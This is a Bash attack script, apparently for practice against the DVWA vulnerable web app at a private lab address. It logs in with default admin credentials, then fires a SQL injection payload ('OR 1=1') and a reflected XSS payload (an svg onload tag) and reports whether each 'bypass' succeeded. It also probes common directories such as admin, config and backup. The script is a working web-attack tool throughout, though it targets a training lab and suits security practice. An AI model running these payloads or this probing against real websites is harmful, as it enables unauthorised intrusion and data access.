#!/bin/bash
# DVWA High Bypass - Bash
# Author: Krishan Sharma

TARGET="http://192.168.220.129/dvwa"
COOKIE=""

echo "╔══════════════════════════╗"
echo "║  DVWA High Bypass - Bash ║"
echo "╚══════════════════════════╝"

# Step 1 - Login karke cookie lo
echo "[*] Logging in..."
COOKIE=$(curl -s -c /tmp/dvwa_cookie.txt \
  -d "username=admin&password=password&Login=Login" \
  "$TARGET/login.php" && \
  cat /tmp/dvwa_cookie.txt)
echo "[+] Session created!"

# Step 2 - SQLi Test
echo -e "\n[*] Testing SQLi..."
RESULT=$(curl -s -b /tmp/dvwa_cookie.txt \
  -d "id=1' OR 1=1-- -&Submit=Submit" \
  "$TARGET/vulnerabilities/sqli/")

if echo "$RESULT" | grep -q "First name"; then
  echo "[+] SQLi BYPASS SUCCESS!"
else
  echo "[-] SQLi blocked"
fi

# Step 3 - XSS Test  
echo -e "\n[*] Testing XSS..."
RESULT=$(curl -s -b /tmp/dvwa_cookie.txt \
  "$TARGET/vulnerabilities/xss_r/?name=<svg+onload=alert(1)>")

if echo "$RESULT" | grep -q "svg"; then
  echo "[+] XSS BYPASS SUCCESS!"
else
  echo "[-] XSS blocked"
fi

# Step 4 - Directory Check
echo -e "\n[*] Checking dirs..."
for dir in admin config backup uploads login; do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" \
    -b /tmp/dvwa_cookie.txt \
    "$TARGET/$dir/")
  if [ "$CODE" = "200" ]; then
    echo "[+] FOUND: $TARGET/$dir/"
  fi
done

echo -e "\n[*] Scan Complete!"
